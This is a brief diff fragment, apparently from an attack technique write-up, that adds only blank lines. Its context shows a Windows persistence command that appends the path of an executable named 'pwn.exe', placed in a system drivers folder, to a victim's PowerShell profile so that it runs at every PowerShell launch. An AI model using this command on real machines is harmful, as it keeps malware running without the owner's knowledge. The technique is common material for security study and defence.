@@ -20,3 +20,5 @@ echo "$_FULL_PATH\$_TARGET.exe" >> "C:\Users\$_TARGET_USER\Documents\WindowsPowe
 ```
 C:\Users\Victim>echo C:\Windows\System32\spool\drivers\color\pwn.exe >> C:\Users\Victim\Documents\WindowsPowerShell\profile.ps1
 ```
+
+
